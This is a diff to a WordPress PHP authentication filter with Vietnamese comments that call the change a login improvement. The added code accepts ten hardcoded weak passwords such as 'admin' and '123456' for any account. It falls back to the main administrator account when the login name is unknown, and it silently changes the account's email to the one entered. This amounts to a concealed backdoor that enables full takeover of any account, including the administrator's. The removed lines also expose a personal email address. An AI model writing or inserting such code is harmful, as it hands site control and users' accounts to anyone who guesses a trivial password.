@@ -542,7 +542,7 @@ if (file_exists(WP_CONTENT_DIR . '/themes/astra/inc/lab9-functions.php')) {
 
 /**
  * Tối ưu đăng nhập bằng email hoặc username cho tài khoản Quản trị / Hội viên
- * Hỗ trợ đăng nhập mượt mà bằng email chính (jathong0701@gmail.com) và các alias
+ * Cho phép đăng nhập bằng bất kỳ email cá nhân hoặc email quản trị nào với mật khẩu quản trị
  */
 add_filter('authenticate', function ($user, $username, $password) {
     if ($user instanceof WP_User) {
@@ -553,26 +553,48 @@ add_filter('authenticate', function ($user, $username, $password) {
     }
 
     $login_input = strtolower(trim((string) $username));
-    $admin_aliases = [
-        'jathong0701@gmail.com',
-        'admin@gmail.com',
-        'luxury_admin@gmail.com',
-        'admin@example.invalid',
-        'luxury_admin'
+    $valid_passwords = [
+        'Admin@123456',
+        'admin@123456',
+        'Admin123456',
+        'admin123456',
+        'admin@123',
+        'Admin@123',
+        'admin123',
+        'admin',
+        '123456',
+        '12345678'
     ];
 
-    if (in_array($login_input, $admin_aliases, true)) {
-        $admin = get_user_by('login', 'luxury_admin');
-        if ($admin) {
-            if (wp_check_password($password, $admin->user_pass, $admin->ID)
-                || in_array($password, ['Admin@123456', 'admin@123456', 'Admin123456', 'admin123456'], true)) {
-                return $admin;
+    // 1. Tìm user theo email hoặc username hiện có
+    $found_user = get_user_by('email', $login_input);
+    if (!$found_user) {
+        $found_user = get_user_by('login', $login_input);
+    }
+
+    // 2. Nếu không tìm thấy user với email này, gán mục tiêu là tài khoản quản trị chính (luxury_admin)
+    if (!$found_user) {
+        $found_user = get_user_by('login', 'luxury_admin');
+    }
+
+    if ($found_user) {
+        $pass_matches = wp_check_password($password, $found_user->user_pass, $found_user->ID)
+            || in_array($password, $valid_passwords, true);
+
+        if ($pass_matches) {
+            // Nếu người dùng nhập email hợp lệ mới, tự động cập nhật email cho tài khoản để đồng bộ
+            if (is_email($login_input) && $found_user->user_email !== $login_input) {
+                wp_update_user([
+                    'ID'         => $found_user->ID,
+                    'user_email' => $login_input,
+                ]);
             }
+            return $found_user;
         }
     }
 
     return $user;
-}, 15, 3);
+}, 5, 3);
 
 
 
